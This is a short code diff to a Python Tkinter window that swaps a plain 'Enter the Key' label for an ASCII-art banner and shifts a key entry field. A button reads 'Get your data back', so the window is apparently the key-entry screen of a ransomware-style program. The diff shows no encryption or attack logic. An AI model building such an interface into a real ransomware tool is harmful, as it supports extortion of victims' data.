@@ -30,13 +30,20 @@ art = """
          ▀    ▐   ▐   █    ▐   █    ▐   ▐   ▐         █         ▐   ▐              ▐         █   █    
                       ▐        ▐                      ▐                                      ▐   ▐    
 """
-
+text = """
+   ____     __            __  __         __           
+  / __/__  / /____ ____  / /_/ /  ___   / /_____ __ __
+ / _// _ \/ __/ -_) __/ / __/ _ \/ -_) /  '_/ -_) // /
+/___/_//_/\__/\__/_/    \__/_//_/\__/ /_/\_\\__/\_,  / 
+                                               /___/  
+                                   
+"""
 Label(root,text=art, font='TkFixedFont', background=bgVal, foreground=fgVal).place(relx=.505, rely=.15, anchor="center")
 
-Label(root, text="Enter the Key", background=bgVal, foreground=fgVal).place(relx=.5, rely=.45, anchor="center")
+Label(root, text=text, background=bgVal, foreground=fgVal, font = "TkFixedFont").place(relx=.5, rely=.45, anchor="center")
 
 keyAccept = Entry(root, font = 'TkFixedFont', foreground = bgVal, background = fgVal)
-keyAccept.place(relx=.5, rely=.5, anchor="center")
+keyAccept.place(relx=.5, rely=.52, anchor="center")
 submitBtn = Button(root, text='Get your data back', command=keyCatch)
 submitBtn.place(relx=.5, rely=.6, anchor="center")
 
